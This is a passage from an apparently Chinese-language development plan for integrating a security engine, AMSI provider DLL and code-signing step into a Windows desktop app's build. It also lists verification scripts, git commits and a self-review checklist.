            lines.append(f"端点防护[{act}] {ev.get('reason') or ev.get('rule_id') or ev.get('source')}")
```

* [ ] **Step 12.5: 运行验证（预期全 PASS）**

Run: `python scripts/_verify_security_settings.py`
Expected: 全部 PASS

* [ ] **Step 12.6: 回归 + 提交**

Run: `python scripts/smoke_test.py`
Expected: 现有回归通过

```powershell
git add src/zhuzhu_Copilot/ui/security_settings_dialog.py src/zhuzhu_Copilot/ui/main_window.py scripts/_verify_security_settings.py ; git commit -m "feat(security): 防护设置对话框与监控线程引擎接入（UI集成）"
```

***

### Task 13: 构建集成 + 全量回归

**Files:**

* Modify: `build/zhuzhu_Copilot.spec`

* Modify: `build_sign.ps1`

* [ ] **Step 13.1: 读当前 spec 的 datas/hiddenimports 段并追加**

Run: `rg -n "datas|hiddenimports|Analysis\(" build/zhuzhu_Copilot.spec`
然后按现有风格追加：

```python
    datas=[
        # ...现有条目...
        ("../config/security_rules.json", "config"),
        ("amsi_provider/amsi_provider.dll", "assets"),
    ],
    hiddenimports=[
        # ...现有条目...
        "zhuzhu_Copilot.core.security_engine",
        "zhuzhu_Copilot.core.security_engine.engine",
        "zhuzhu_Copilot.core.security_engine.rules",
        "zhuzhu_Copilot.core.security_engine.file_intel",
        "zhuzhu_Copilot.core.security_engine.signature",
        "zhuzhu_Copilot.core.security_engine.script_intel",
        "zhuzhu_Copilot.core.security_engine.llm_analyzer",
        "zhuzhu_Copilot.core.security_engine.ransomware_shield",
        "zhuzhu_Copilot.core.security_engine.startup_guard",
        "zhuzhu_Copilot.core.security_engine.command_intel",
        "zhuzhu_Copilot.core.security_engine.amsi_bridge",
    ],
```

（相对 spec 文件所在 build/ 目录的路径按该文件现有 datas 条目的相对基准对齐；若现有条目以绝对路径/变量书写，沿用同一方式。）

* [ ] **Step 13.2: 扩展签名脚本**

在 `build_sign.ps1` 现有签名命令后追加 AMSI DLL 签名（沿用 zhutianliang 证书相同的 SignTool 调用方式）：

```powershell
Write-Host "签名 AMSI Provider DLL..."
& $signtool sign /f $cert /p $pass /t $tsa "$dll\amsi_provider.dll" -- 按现有脚本实际变量名对齐
```

（变量名与现有脚本保持一致，先读 `build_sign.ps1` 现有签名段再追加。）

* [ ] **Step 13.3: 全量验证**

Run:

```powershell
python scripts/smoke_test.py
python scripts/_verify_rules_engine.py
python scripts/_verify_file_intel.py
python scripts/_verify_signature.py
python scripts/_verify_script_intel.py
python scripts/_verify_llm_analyzer.py
python scripts/_verify_engine.py
python scripts/_verify_ransomware_shield.py
python scripts/_verify_startup_guard.py
python scripts/_verify_command_intel.py
python scripts/_verify_amsi_bridge.py
python scripts/_verify_security_settings.py
```

Expected: 全部退出码 0（\_verify\_amsi\_dll.py 无管理员时允许 SKIP）。

* [ ] **Step 13.4: 提交**

```powershell
git add build/zhuzhu_Copilot.spec build_sign.ps1 ; git commit -m "build(security): 打包集成security_engine/规则库/AMSI DLL与签名"
```

***

## Self-Review 记录（内部自检，非用户可见步骤）

* **Spec 覆盖度核对**：规则引擎(T1)、文件/脚本/命令智能识别(T2/T4/T9)、LLM 可选深度分析(T5)、AMSI Provider DLL+注册(T10/T11)、勒索实时盾+溯源(T7)、启动项实时防护(T8)、分级处置+隔离扩展+审计(T6)、设置页与守护线程接入(T12)、构建签名集成(T13) — 全部有对应任务；信任目录 UI 落于设置对话框（trust\_list），勒索模块速度阈值等外置于 security\_rules.json ✓

* **无占位符**：所有代码/命令/断言均为完整内容，无 TBD/TODO ✓

* **类型/命名一致性**：`DirWatcher` 由 ransomware\_shield 定义并被 startup\_guard 复用（Task 8 引 Task 7 同一类名）；`_QUARANTINE_ROOT` 沿用 security.py 常量；事件字段（kind/source/confidence/rule\_id/entry/targets）在 Task 6/7/8/9 间保持一致；AMSI GUID `{7C4E1B9A-2F0D-4A6B-9C3E-5D8F1A2B3C40}` 在 amsi\_bridge.py / amsi\_provider.c / 注册表键三处一致 ✓

* 每个任务独立可测、随做随提交，符合项目"每项功能必须 Test and Debug"硬性要求 ✓

